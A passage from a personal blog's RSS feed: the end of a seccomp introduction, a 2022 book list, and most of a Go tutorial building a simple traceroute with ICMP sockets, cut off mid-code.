</span></span><span style="display:flex;"><span>0x4e:	ret	                            &lt;-- <span style="color:#66d9ef">return</span> 0x7fff0000 allowing the syscall
</span></span><span style="display:flex;"><span>0x4f:	int3	                        &lt;-- not sure why this int3 is here, probably to trap the process <span style="color:#66d9ef">for</span> some reason
</span></span><span style="display:flex;"><span>0x50:	xor	eax, eax                    &lt;-- set eax to <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>0x52:	jmp	0x4a                        &lt;-- jump to 0x4a and <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span> forbidding the syscall
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>This post was just an introduction to seccomp and how to use it. I hope it will be useful for someone. We started with the basics of seccomp, then we saw how to use it in various programming languages and finally we took a look at how it works on the kernel side. I hope you enjoyed it and learned something new. Reader is encouraged to read documentation an references provided at the end of this post and try to write a seccomp filter for a syscall and see how it works.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Seccomp">Seccomp</a></li>
<li><a href="https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html">Seccomp filter</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">Seccomp man</a></li>
<li><a href="https://github.com/seccomp/libseccomp">Seccomp C library</a></li>
<li><a href="https://github.com/seccomp/libseccomp-golang">Seccomp Go library</a></li>
<li><a href="https://crates.io/crates/libseccomp">Seccomp Rust library</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Books list 2022</title>
            <link>https://example.org/posts/09-books-2022/</link>
            <pubDate>Sat, 31 Dec 2022 17:46:40 +0200</pubDate>
            
            <guid>https://example.org/posts/09-books-2022/</guid>
            <description>Another year, another list of books.
Rust for Rustaceans Practical IoT Hacking Rock Guitar Tapping Technique Linux Kernel Debugging The Legendary Guitar of Jason Becker Marty Friedman: Exotic Metal Guitar Il Richiamo di Cthulhu (Gou Tanabe – Graphic Novel) Le Montagne della Follia (Gou Tanabe – Graphic Novel) </description>
            <content type="html"><![CDATA[<p>Another year, another list of books.</p>
<ul>
<li>Rust for Rustaceans</li>
<li>Practical IoT Hacking</li>
<li>Rock Guitar Tapping Technique</li>
<li>Linux Kernel Debugging</li>
<li>The Legendary Guitar of Jason Becker</li>
<li>Marty Friedman: Exotic Metal Guitar</li>
<li>Il Richiamo di Cthulhu (Gou Tanabe – Graphic Novel)</li>
<li>Le Montagne della Follia (Gou Tanabe – Graphic Novel)</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Writing a simple Traceroute in Go</title>
            <link>https://example.org/posts/13-traceroute-2022/</link>
            <pubDate>Tue, 08 Nov 2022 00:00:00 +0000</pubDate>
            
            <guid>https://example.org/posts/13-traceroute-2022/</guid>
            <description>If your question is why, the answer is quite simple: why not? And by the way, my favorite question is: how?
So, how does a traceroute program works in general? (In this post we&amp;rsquo;re considering traceroute in IPv4 networks)
Well, basically traceroute exploits a very simple concept. It sends IPv4 packets starting with TTL = 1 to a remote host, continues incrementing it and expects back ICMPv4 TimeExceeded packets from intermediary hosts or an ICMPv4 EchoReply from the destination one.</description>
            <content type="html"><![CDATA[<p>If your question is why, the answer is quite simple: why not? And by the way, my favorite question is: how?</p>
<p>So, how does a traceroute program works in general? (<em>In this post we&rsquo;re considering traceroute in IPv4 networks</em>)</p>
<p>Well, basically traceroute exploits a very simple concept. It sends IPv4 packets starting with TTL = 1 to a remote host, continues incrementing it and expects back ICMPv4 TimeExceeded packets from intermediary hosts or an ICMPv4 EchoReply from the destination one.</p>
<p>IPv4 Packet
<img src="/ipv4_packet.jpg" alt="ipv4_packet"></p>
<p>ICMP Packet
<img src="/icmp_packet.jpg" alt="icmp_packet"></p>
<p>So, suppose we’re host <code>192.168.1.2</code> and our target is host <code>10.1.14.10</code>. And, suppose there are <code>N</code> hosts that need to be traversed before reaching our target. What happens then?</p>
<p><code>192.168.1.1</code> forges a series of IPv4 packets that range from <code>1</code> to say <code>M</code> (where <code>M</code> is a tunable parameter to denote the maximum number of hosts to traverse). It sends those packets and maybe in a different thread starts waiting for ICMPv4 messages.</p>
<p>Notice that this explanation is pretty much simplistic and I encourage you to read manual page of <a href="https://man7.org/linux/man-pages/man8/traceroute.8.html">traceroute(8)</a>.</p>
<p>The simple traceroute program we’re going to build uses Linux ICMP sockets. Basically a kind of raw socket where we bind on an address and wait for ICMP packets. There’s a nice [Go package<a href="https://pkg.go.dev/golang.org/x/net"></a> which will help us opening such kind of sockets and provides us all with all the data structures we need to parse and send packets.</p>
<p>So let’s start! <em>(Notice that here we will provide most interesting snippets of code, the complete code will be linked at the end of the article)</em></p>
<p>First of all we need to import relevant packages we need:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;golang.org/x/net/icmp&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;golang.org/x/net/ipv4&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>Now what?</p>
<p>Well, we create an ICMP socket in the main of our application and start listening on it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// start listening for ICMP messages
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">c</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">ListenPacket</span>(<span style="color:#e6db74">&#34;ip4:icmp&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now that we’ve our connection object, we need a function that waits for packets on it and processes them. Of course we’re going to run this function in a different goroutine. Why? Because later we’re going to send packets from main routine and this routine will be already there to catch responses.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">waitResponses</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">PacketConn</span>, <span style="color:#a6e22e">timeout</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Duration</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">startTime</span> <span style="color:#66d9ef">float64</span>, <span style="color:#a6e22e">targetHost</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">maxTTL</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">id</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">wg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a new Timer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">timer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">NewTimer</span>(<span style="color:#a6e22e">timeout</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a map to receive results
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">results</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">int</span>]<span style="color:#a6e22e">Result</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Read the response
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">reply</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">1500</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">n</span>, <span style="color:#a6e22e">peer</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">ReadFrom</span>(<span style="color:#a6e22e">reply</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Parse the response
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">rm</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">ParseMessage</span>(<span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">reply</span>[:<span style="color:#a6e22e">n</span>])
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to parse ICMPv4 message: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// check type of ICMP message
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">switch</span> <span style="color:#a6e22e">rm</span>.<span style="color:#a6e22e">Type</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">ipv4</span>.<span style="color:#a6e22e">ICMPTypeEchoReply</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rm</span>.<span style="color:#a6e22e">Body</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">Echo</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ok</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;not an echo reply&#34;</span>)
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// we skip if the response does not
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#75715e">// come from the target host
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">peer</span>.<span style="color:#a6e22e">String</span>() <span style="color:#f92672">!=</span> <span style="color:#a6e22e">targetHost</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// store results in a map keyed by thesequence number
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Result</span>{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">IP</span>:            <span style="color:#a6e22e">peer</span>.<span style="color:#a6e22e">String</span>(),
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">HOP</span>:           <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Seq</span>,
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">TimeElapsedMS</span>: float64(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">UnixNano</span>()<span style="color:#f92672">/</span><span style="color:#ae81ff">1000000</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">startTime</span>,
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// store the result
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Seq</span>] = <span style="color:#a6e22e">r</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">ipv4</span>.<span style="color:#a6e22e">ICMPTypeTimeExceeded</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// cast to icmp.TimeExceeded
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rm</span>.<span style="color:#a6e22e">Body</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">TimeExceeded</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ok</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to cast to icmp.TimeExceeded&#34;</span>)
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// icmp.TimeExceeded contains the original packet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#75715e">// so we grab IPv4 header and ICMP header
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">ipHdr</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">ParseIPv4Header</span>(<span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Data</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to parse IPv4 header&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// grab the ICMP header
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">icmpMsg</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">ParseMessage</span>(<span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Data</span>[<span style="color:#a6e22e">ipHdr</span>.<span style="color:#a6e22e">Len</span>:]); <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">msg</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmpMsg</span>.<span style="color:#a6e22e">Body</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">Echo</span>); <span style="color:#a6e22e">ok</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">ID</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">id</span> {
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Result</span>{
</span></span><span style="display:flex;"><span>							<span style="color:#a6e22e">IP</span>:            <span style="color:#a6e22e">peer</span>.<span style="color:#a6e22e">String</span>(),
</span></span><span style="display:flex;"><span>							<span style="color:#a6e22e">HOP</span>:           <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">Seq</span>,
</span></span><span style="display:flex;"><span>							<span style="color:#a6e22e">TimeElapsedMS</span>: float64(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">UnixNano</span>()<span style="color:#f92672">/</span><span style="color:#ae81ff">1000000</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">startTime</span>,
</span></span><span style="display:flex;"><span>						}
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">Seq</span>] = <span style="color:#a6e22e">r</span>
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to parse inner ICMPv4 message&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">default</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Unexpected response %+v: %s&#34;</span>, <span style="color:#a6e22e">rm</span>, <span style="color:#a6e22e">peer</span>.<span style="color:#a6e22e">String</span>())
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">timer</span>.<span style="color:#a6e22e">C</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// print the results
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">maxTTL</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">i</span>]; <span style="color:#a6e22e">ok</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%d\t%s\t%.2f ms\n&#34;</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">HOP</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">IP</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">TimeElapsedMS</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">IP</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">targetHost</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%d\t*\n&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Do not get intimidated by this code, we’re just going to break it down!</p>
<p>First of all, parameters:</p>
<ul>
<li><code>c</code> is our packet connection we just created into our main.</li>
<li><code>timeout</code> is the maximum timeout we’re going to wait for packets to come. We don’t want our program runs forever, right?</li>
<li><code>startTime</code> is the time in milliseconds from Epoch when we started our program</li>
<li><code>targetHost</code> is the final host we want to reach with our packets</li>
<li><code>maxTTL</code> is the maximum number of the TTL we used aka the maximum number of hosts that we could traverse to reach our target</li>
<li><code>id</code> is a crafted ID that we use to check that’s the reply TimeExceeded packet we’re waiting for, e.g., is one of those we forged (more on this later)</li>
<li><code>wg</code> is a WaitGroup, we use it so our main routine does not just exits before we finish to process packets or timeout has just expired</li>
</ul>
<p>We first create some variables we’ll need in this routine:</p>
<ul>
<li>a timer to control if we’ve reached a timeout and so we’ve to just return</li>
<li>a map were we’re going to store a Result objects as values (more in a moment). Key is the TTL of a packet, so we can check in which position of the route it was the traversed host.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// create a new Timer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">timer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">NewTimer</span>(<span style="color:#a6e22e">timeout</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a map to receive results
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">results</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">int</span>]<span style="color:#a6e22e">Result</span>, <span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><p>Here there’s our result type:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Result</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// IP address of this HOP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">IP</span>            <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// HOP number (aka initial TTL that produced this host)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">HOP</span>           <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// How did it take in millisecs for this host to reply our packet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">TimeElapsedMS</span> <span style="color:#66d9ef">float64</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now we create a new goroutine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Read the response
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">reply</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">1500</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">n</span>, <span style="color:#a6e22e">peer</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">ReadFrom</span>(<span style="color:#a6e22e">reply</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Parse the response
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">rm</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">ParseMessage</span>(<span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">reply</span>[:<span style="color:#a6e22e">n</span>])
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to parse ICMPv4 message: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">...</span><span style="color:#a6e22e">snipped</span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	}()
</span></span></code></pre></div><p>We loop reading packets, since IPv4 maximum transfer unit is 1500 bytes, we prepare a buffer large enough to hold it. The ReadFrom function on the c connection object returns us:</p>
<ul>
<li><code>n</code> which is the number of byte read from the connection</li>
<li><code>peer</code> is a net.Addr object which contains IPv4 source address of the packet</li>
<li><code>err</code> will be not nil if something went wrong while reading the packet</li>
</ul>
<p>Once we’ve our <code>reply</code> buffer filled with our <code>ICMPv4</code> packet data we use <code>icmp.ParseMessage</code> and give to this function the protocol number (<code>1</code> for <code>ICMPv4</code>) and a slice of the buffer from start to <code>n</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">icmp</span> <span style="color:#75715e">// import &#34;golang.org/x/net/icmp&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Message</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Type</span>     <span style="color:#a6e22e">Type</span>        <span style="color:#75715e">// type, either ipv4.ICMPType or ipv6.ICMPType
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Code</span>     <span style="color:#66d9ef">int</span>         <span style="color:#75715e">// code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Checksum</span> <span style="color:#66d9ef">int</span>         <span style="color:#75715e">// checksum
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Body</span>     <span style="color:#a6e22e">MessageBody</span> <span style="color:#75715e">// body
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">A</span> <span style="color:#a6e22e">Message</span> <span style="color:#a6e22e">represents</span> <span style="color:#a6e22e">an</span> <span style="color:#a6e22e">ICMP</span> <span style="color:#a6e22e">message</span>.
</span></span></code></pre></div><p>Since the socket will return us all <code>ICMPv4</code> packets observed on the “wire” we now need to check the Message.Type field and start filtering the information we need:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">...</span><span style="color:#a6e22e">snipped</span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// check type of ICMP message
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">switch</span> <span style="color:#a6e22e">rm</span>.<span style="color:#a6e22e">Type</span> {
